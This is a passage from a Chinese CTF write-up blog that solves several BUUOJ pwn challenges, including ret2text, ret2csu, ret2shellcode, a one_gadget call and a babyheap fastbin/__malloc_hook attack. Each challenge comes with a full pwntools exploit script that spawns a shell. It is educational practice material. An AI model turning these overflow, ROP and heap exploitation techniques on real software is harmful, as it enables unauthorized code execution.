class="number">0x80ea000</span></span><br><span class="line">offset = <span class="number">0x2d</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b'A'</span>*offset + p32(mprotect_addr) + p32(pop_ebx_esi_edi_ebp_ret) + p32(sc_addr) + p32(<span class="number">0x100</span>) + p32(<span class="number">0x7</span>) + p32(<span class="number">0xdeadbeef</span>)  + p32(read_addr) + p32(sc_addr) + p32(<span class="number">0</span>) + p32(sc_addr) + p32(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">payload2 = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行脚本即得shell</p><p><img src="https://i.loli.net/2020/09/20/WNngpZqb32UfarH.png" alt="image.png"></p><h1 id="0x00F-one-gadget-one-gadget"><a href="#0x00F-one-gadget-one-gadget" class="headerlink" title="0x00F.one_gadget - one_gadget"></a>0x00F.one_gadget - one_gadget</h1><blockquote><p> 首先从题目名字我们就可以看出这道题应该需要我们用到一个工具——<a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">one_gadget</a></p><p> 什么是one_gadget？即在libc中存在着的可以直接getshell的gadget</p></blockquote><p>惯例的<code>checksec</code>，发现<strong>保  护  全  开</strong>（<strong>心 肺 停 止</strong></p><p><img src="https://i.loli.net/2020/09/20/LrGYDRVBwkmJ49K.png" alt="image.png"></p><p>拖进IDA里分析</p><p><img src="https://i.loli.net/2020/09/20/sh7PJmrCWN2fRBv.png" alt="image.png"></p><p>主函数会读入一个整数到<strong>函数指针</strong>v4中，并尝试执行<code>v4()</code>，故我们只需要输入<strong>one_gadget</strong>的地址即可getshell</p><p>使用<code>one_gadget</code>工具可以找出libc中的getshell gadget</p><blockquote><p>不明原因在arch上一直没法运行，只好切到Ubuntu</p></blockquote><p><img src="https://i.loli.net/2020/09/20/I5t8xJdkwloaGeA.png" alt="image.png"></p><p>但是我们还需要知道libc的基址</p><p>我们可以发现在<code>init()</code>函数中会输出<code>printf()</code>函数的地址，有了这个我们便可以计算出libc的基址，也就有了one_gadget的真实地址</p><p>而题目也给了我们libc，故构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">one_gadget = <span class="number">0xe237f</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./one_gadget'</span>)<span class="comment">#p = remote('node3.buuoj.cn',27792)#</span></span><br><span class="line">e = ELF(<span class="string">'./one_gadget'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.29.so'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'here is the gift for u:'</span>)</span><br><span class="line">printf_addr = u64(p.recvuntil(<span class="string">'\n'</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">libc_base = printf_addr - libc.sym[<span class="string">'printf'</span>]</span><br><span class="line">getshell = libc_base + one_gadget</span><br><span class="line">p.sendline(str(getshell))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x010-jarvisoj-level2-ret2text"><a href="#0x010-jarvisoj-level2-ret2text" class="headerlink" title="0x010.jarvisoj_level2 - ret2text"></a>0x010.jarvisoj_level2 - ret2text</h1><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p><p><img src="https://i.loli.net/2020/09/21/Fy45LtX2TbDZmCw.png" alt="image.png"></p><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/09/21/udFMIAQECL71B3D.png" alt="image.png"></p><p>读入最大0x100字节，但是<code>buf</code>到ebp之间只有0x88字节的空间，存在溢出</p><p>同时我们也可以知道该程序中有<code>system()</code>函数可以利用</p><p>同时程序中还存在<code>&quot;/bin/sh&quot;</code>字符串</p><p><img src="https://i.loli.net/2020/09/21/ODpha1fMLGsxdHN.png" alt="image.png"></p><p>故只需要构造rop链执行<code>system(&quot;/bin/sh&quot;)</code>即可getshell</p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./level2'</span>)<span class="comment">#p = remote('node3.buuoj.cn',26276)#</span></span><br><span class="line">e = ELF(<span class="string">'./level2'</span>)</span><br><span class="line">sh_addr = <span class="number">0x804A024</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x88</span> + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">'system'</span>]) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行即可getshell</p><p><img src="https://i.loli.net/2020/09/21/1SBivHVUXTmd6rM.png" alt="image.png"></p><h1 id="0x011-HarekazeCTF2019-baby-rop-ret2text-ret2csu"><a href="#0x011-HarekazeCTF2019-baby-rop-ret2text-ret2csu" class="headerlink" title="0x011.[HarekazeCTF2019]baby_rop - ret2text + ret2csu"></a>0x011.[HarekazeCTF2019]baby_rop - ret2text + ret2csu</h1><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p><p><img src="https://i.loli.net/2020/09/21/KLwbUyHQnN3YWTR.png" alt="image.png"></p><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/09/21/ERABfyXm6k1dvZl.png" alt="image.png"></p><p>使用<code>scanf(&quot;%s&quot;)</code>读入字符串，存在溢出漏洞</p><p><img src="https://i.loli.net/2020/09/21/OSY69XjyadgBbV2.png" alt="image.png"></p><p>存在<code>system()</code>函数</p><p><img src="https://i.loli.net/2020/09/21/IX7bcApO3V8axJ1.png" alt="image.png"></p><p>存在<code>/bin/sh</code>字符串</p><p>故考虑使用csu中gadget构造rop链执行<code>system(&quot;/bin/sh&quot;)</code>函数以getshell</p><p><img src="https://i.loli.net/2020/09/21/jJeyg9MLalYGnZX.png" alt="image.png"></p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x601048</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400683</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">27558</span>)</span><br><span class="line">e = ELF(<span class="string">'./babyrop'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x10</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) +  p64(sh_addr) + p64(e.sym[<span class="string">'system'</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行即得flag</p><p><img src="https://i.loli.net/2020/09/21/P4QqLJyplu2xF9r.png" alt="image.png"></p><blockquote><p>好多一样的题啊Or2</p></blockquote><h1 id="0x012-bjdctf-2020-babystack-ret2text"><a href="#0x012-bjdctf-2020-babystack-ret2text" class="headerlink" title="0x012.bjdctf_2020_babystack - ret2text"></a>0x012.bjdctf_2020_babystack - ret2text</h1><blockquote><p>又是一模一样的题。。。</p></blockquote><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p><p><img src="https://i.loli.net/2020/09/21/DQAdo9gNevJrtBz.png" alt="image.png"></p><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/09/21/L5gZjv1rh3bIEt7.png" alt="image.png"></p><p>主函数中用户可以控制读入的字符数量，存在溢出</p><p>同时存在可以getshell的<code>backdoor()</code>函数</p><p><img src="https://i.loli.net/2020/09/21/GMBR1ib9dHNxlPX.png" alt="image.png"></p><p>故考虑构造rop链执行<code>backdoor()</code>函数即可</p><p>构造exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x10</span> + p64(<span class="number">0xdeadbeef</span>) + p64(<span class="number">0x4006e6</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">25806</span>)<span class="comment">#p = process('./bjdctf_2020_babystack')</span></span><br><span class="line">p.sendline(<span class="string">b'100'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行即可getshell</p><p><img src="https://i.loli.net/2020/09/21/nBZbpiVdHPRvu9c.png" alt="image.png"></p><h1 id="0x013-babyheap-0ctf-2017-Unsorted-bin-leak-Fastbin-Attack-one-gadget"><a href="#0x013-babyheap-0ctf-2017-Unsorted-bin-leak-Fastbin-Attack-one-gadget" class="headerlink" title="0x013.babyheap_0ctf_2017 - Unsorted bin leak + Fastbin Attack + one_gadget"></a>0x013.babyheap_0ctf_2017 - Unsorted bin leak + Fastbin Attack + one_gadget</h1><blockquote><p>来到BUU后做的第一道堆题</p></blockquote><p>惯例的<code>checksec</code>，发现<strong>保  护  全  开</strong>（<strong>心 肺 停 止</strong></p><p><img src="https://i.loli.net/2020/09/21/aZJExgI4UqDuPoj.png" alt="image.png"></p><p>拖入IDA里进行分析（以下部分函数、变量名经过重命名）</p><p>常见的堆题基本上都是菜单题，本题也不例外<img src="https://i.loli.net/2020/09/30/VEjFKYhibtqHfs6.png" alt="image.png"></p><p>我们可以发现在<code>writeHeap()</code>函数中并没有对我们输入的长度进行检查，<strong>存在堆溢出</strong></p><p><img src="https://i.loli.net/2020/09/30/WAOCpdZMVRlSxgm.png" alt="image.png"></p><p>故我们考虑先创建几个小堆块，再创建一个大堆块，free掉两个小堆块进入到fastbin，用堆溢出改写fastbin第一个块的fd指针为我们所申请的大堆块的地址，需要注意的是fastbin会对chunk的size进行检查，故我们还需要先通过堆溢出改写大堆块的size，之后将大堆块分配回来后我们就有两个指针指向同一个堆块</p><p><img src="https://i.loli.net/2020/10/07/XARM5QmBzFadtWi.png" alt="62DB8B2E56B87418664EEB947A980782.png"></p><p>利用堆溢出将大堆块的size重新改大再free以送入unsorted bin，此时大堆块的fd与bk指针指向main_arena+0x58的位置，利用另外一个指向该大堆块的指针输出fd的内容即可得到main_arena+0x58的地址，就可以算出libc的基址</p><p><img src="https://i.loli.net/2020/10/07/IBAZ6ChTOrQwonp.png" alt="72934A2F942430E796048F09C96A261F.png"></p><p>接下来便是fastbin attack：将某个堆块送入fastbin后改写其fd指针为__malloc_hook的地址（__malloc_hook位于main_arena上方0x10字节处），再将该堆块分配回来，此时fastbin中该链表上就会存在一个我们所伪造的位于__malloc_hook上的堆块，申请这个堆块后我们便可以改写malloc_hook上的内容为后门函数地址，最后随便分配一个堆块便可getshell</p><p>考虑到题目中并不存在可以直接getshell的后门函数，故考虑使用one_gadget以getshell</p><p><img src="https://i.loli.net/2020/10/07/glLRkSdY3GufeOv.png" alt="D2D612904D8AB28F1DCCE651D4B81508.png"></p><p>需要注意的是fastbin存在size检查，故具体的<strong>能够让fake chunk的size刚好为特定值</strong>的那个地址可能位于__malloc_hook上方的某一处，需要我们多次尝试得到偏移量</p><p>构造payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">27143</span>)<span class="comment">#process('./babyheap_0ctf_2017')#</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size:int)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(index:int,content)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Content: \n'</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recvline()</span><br><span class="line">    </span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx0</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>) <span class="comment">#idx1</span></span><br><span class="line">free(<span class="number">2</span>) <span class="comment">#idx2</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx1, the former idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx2, the former idx4</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx5, prevent the top chunk combine it</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#idx2 got into unsorted bin, fd points to the main_arena</span></span><br><span class="line"></span><br><span class="line">main_arena = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>].strip().ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>)) - <span class="number">0x58</span></span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#idx2 got into fastbin</span></span><br><span class="line">payload = p64(malloc_hook - <span class="number">0x23</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload) <span class="comment">#overwrite fd to fake chunk addr</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx6, our fake chunk</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x13</span> + p64(one_gadget)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行脚本即得flag</p><p><img src="https://i.loli.net/2020/10/07/9n7EyWL5OC3aIcm.png" alt="image.png"></p><h1 id="0x014-ciscn-2019-n-5-ret2shellcode"><a href="#0x014-ciscn-2019-n-5-ret2shellcode" class="headerlink" title="0x014.ciscn_2019_n_5 - ret2shellcode"></a>0x014.ciscn_2019_n_5 - ret2shellcode</h1><p>惯例的<code>checksec</code>，发现近乎保护全关，整挺好</p><p><img src="https://i.loli.net/2020/10/09/6YLBG8h3kfrqEFl.png" alt="9FIY_KOU2UD64__0RB5U66B.png"></p><p>拖入IDA进行分析</p><p>![41L`5F__UIYNB_H_YE_DEHD.png](<a href="https://i.loli.net/2020/10/09/zTYkWulo1hyLKvB.png" target="_blank" rel="noopener">https://i.loli.net/2020/10/09/zTYkWulo1hyLKvB.png</a>)</p><p>一开始先向bss段上的<code>name</code>读入最大<code>0x64</code>字节的内容，之后再使用<code>gets()</code>读入到text上，存在栈溢出</p><p>故考虑先向<code>name</code>上写入shellcode再控制程序跳转至<code>name</code>即可</p><p>bss段上<code>name</code>的地址为<code>0x601080</code></p><p><img src="https://i.loli.net/2020/10/09/Il3iOrAao5phSXm.png" alt="3N50O64P@_TF@5SAT_@__KU.png"></p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x601080</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x20</span> + p64(<span class="number">0xdeadbeef</span>) + p64(bss_addr)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./ciscn_2019_n_5'</span>)<span class="comment">#remote('node3.buuoj.cn',27296)</span></span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行，成功getshell</p><p><img src="https://i.loli.net/2020/10/09/kxmOadD1Py7GYLM.png" alt="ZGX5RGFHA_NTT96WDXA__4T.png"></p><h1 id="0x015-level2-x64-ret2csu"><a href="#0x015-level2-x64-ret2csu" class="headerlink" title="0x015.level2_x64 - ret2csu"></a>0x015.level2_x64 - ret2csu</h1><p>惯例的<code>checksec</code>，发现只开了NX保护</p><p><img src="https://i.loli.net/2020/10/09/wMdhOJgrpDZCicA.png" alt="image.png"></p><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/10/09/cusBMX2AOeT7yEt.png" alt="image.png"></p><p>在<code>vulnerable_function()</code>处存在栈溢出，且存在<code>system()</code>函数</p><p><img src="https://i.loli.net/2020/10/09/hGbO9NaLnkory3I.png" alt="image.png"></p><p>在.data段存在<code>&quot;/bin/sh&quot;</code>字符串</p><p>故考虑构造rop链执行<code>system(&quot;/bin/sh&quot;)</code>即可getshell</p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x600A90</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4006B3</span></span><br><span class="line">call_sys = <span class="number">0x400603</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x80</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(sh_addr) + p64(call_sys)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./level2_x64'</span>)<span class="comment">#remote('node3.buuoj.cn',26289)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行脚本即得flag</p><p><img src="https://i.loli.net/2020/10/09/85mfFgLiZVYXeuN.png" alt="image.png"></p><h1 id="0x016-ciscn-2019-ne-5-ret2text"><a href="#0x016-ciscn-2019-ne-5-ret2text" class="headerlink" title="0x016.ciscn_2019_ne_5 - ret2text"></a>0x016.ciscn_2019_ne_5 - ret2text</h1><p>惯例的<code>checksec</code>，发现只开了NX保护</p><p><img src="https://i.loli.net/2020/10/09/5Z3rzc8pPb61hjL.png" alt="image.png"></p><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/10/09/aqwxIRMizvbVkPF.png" alt="ZX9_6BVAK5A_V_BL__V_I0X.png"></p><p>看起来长得像堆题但其实完全没有堆的操作，还是传统的栈题</p><p>在<code>AddLog()</code>函数中读入最大128字节到字符串<code>src</code>中</p><p>![UXHLHKU0D9MFLEY3MJK_`QT.png](<a href="https://i.loli.net/2020/10/09/TREtZOFSvhdqVup.png" target="_blank" rel="noopener">https://i.loli.net/2020/10/09/TREtZOFSvhdqVup.png</a>)</p><p>在<code>GetFlag()</code>函数中会拷贝<code>src</code>到<code>dest</code>上，存在栈溢出</p><p><img src="https://i.loli.net/2020/10/09/FHvp3yewxTmkG6Z.png" alt="_@SVK_64XY_UGE02KN_Q6_9.png"></p><p>同时程序中存在<code>system()</code>函数与<code>sh</code>字符串</p><p><img src="https://i.loli.net/2020/10/09/q8KI9ocLn1NybWz.png" alt="image.png"></p><p>![X0WS9USGGKI`WCZK0_J80_7.png](<a href="https://i.loli.net/2020/10/09/a7OuQVLPsSAMd85.png" target="_blank" rel="noopener">https://i.loli.net/2020/10/09/a7OuQVLPsSAMd85.png</a>)</p><p>故直接溢出控制程序执行<code>system(&quot;/bin/sh&quot;)</code>即可</p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x80482ea</span></span><br><span class="line">call_sys = <span class="number">0x80486b9</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x48</span> + p32(<span class="number">0xdeadbeef</span>) + p32(call_sys)  + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./ciscn_2019_ne_5'</span>)<span class="comment">#remote('node3.buuoj.cn',26005)</span></span><br><span class="line">p.sendline(<span class="string">b'administrator'</span>)</span><br><span class="line">p.sendline(<span class="string">b'1'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b'4'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行即可getshell</p><p>![L_YGD`OM1C_L_RJ~7__23SD.png](<a href="https://i.loli.net/2020/10/09/TUIEloeFPhfsXqC.png" target="_blank" rel="noopener">https://i.loli.net/2020/10/09/TUIEloeFPhfsXqC.png</a>)</p><h1 id="0x017-ciscn-2019-s-3-ret2csu-SROP"><a href="#0x017-ciscn-2019-s-3-ret2csu-SROP" class="headerlink" title="0x017.ciscn_2019_s_3 - ret2csu || SROP"></a>0x017.ciscn_2019_s_3 - ret2csu || SROP</h1><blockquote><p> 应<a href="https://ll1ng.github.io" target="_blank" rel="noopener">某位可爱的女师傅</a>的要求先来做这道题（（（</p></blockquote><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p><p><img src="https://i.loli.net/2020/09/13/ip9xYzyfsF8eSvU.png" alt="image.png"></p><p>拖入IDA进行分析：<br><img src="https://i.loli.net/2020/09/13/QX6bdK57hjWCyrG.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/09/13/5RsPUNZAyV2ot7f.png" alt="image.png"></p><p>可以看到，<code>main()</code>函数会调用<code>vuln()</code>函数，在<code>vuln()</code>函数中会调用两个<strong>系统调用</strong>——0号系统调用<code>sys_read</code>读入最大<strong>0x400</strong>个字节到buf上，buf只分配到了<strong>0x10</strong>个字节的空间，存在栈溢出；随后调用1号系统调用<code>sys_write</code>输出buf上的<strong>0x30</strong>字节的内容</p><p>同时我们还可以观察到有一个没有被用到的<code>gadget()</code>函数，里面有两条gadget<strong>将rax设为0xf或0x3b</strong>，也就是15或59</p><p><img src="https://i.loli.net/2020/09/13/eBiLZDC9uwRxvIP.png" alt="image.png"></p><p>而<code>syscall</code>指令从<strong>rax寄存器</strong>中读取值并调用相对应的系统调用（从程序本身的代码我们也可以看出这一点），对应的我们可以想到的是这个gadget要我们通过相应的<strong>系统调用</strong>来getshell</p><p>在64位Linux下，15号系统调用是<strong>rt_sigreturn</strong>，而59号系统调用则是我们所熟悉的<strong>execve</strong>，<del>那么这个系统调用该怎么利用呢我暂且蒙在古里</del></p><blockquote><p>系统调用一览表见<a href="https://archive.next.arttnba3.cn/2000/10/12/%E3%80%90%E8%B5%84%E6%96%99%E5%AD%98%E6%A1%A3-0x01%E3%80%91Linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%80%E8%A7%88-by-arttnba3/">这里</a></p></blockquote><p>考虑到在<code>vuln()</code>函数中只分配了<code>0x10</code>个字节的空间给buf，但是后面的系统调用<code>write</code>会输出0x30个字节的内容，即除了我们的输入之外还会打印一些栈上的内容，其中前0x20个字节的内容分别为：0x10字节的buf、8字节的old_rbp（作为返回地址）、8字节的main函数中的<code>call vuln</code>指令的下一条指令的地址，剩下的0x10个字节则是栈上的一些其他的内容</p><p>我们使用gdb进行调试看看是什么内容：</p><p><img src="https://i.loli.net/2020/09/14/TcMSfPtdDmQhuAC.png" alt="image.png"></p><p>可以看到<code>0x7fffffffdc60</code>上储存的内容即为<code>old_rbp</code>，<code>0x7fffffffdc68</code>上储存的内容为main函数中的<code>call vuln</code>指令的下一条指令的地址，而<code>0x7fffffffdc70</code>上储存的则是一个<strong>地址</strong>，我们很容易计算得出其与栈基址间的偏移量为<strong>0x7fffffffdd78 - 0x7fffffffdc60 = 0x118</strong></p><p>那么我们只需要读取这个值再减去偏移量便可以<strong>得到栈基址的地址</strong></p><h2 id="解法1：ret2csu"><a href="#解法1：ret2csu" class="headerlink" 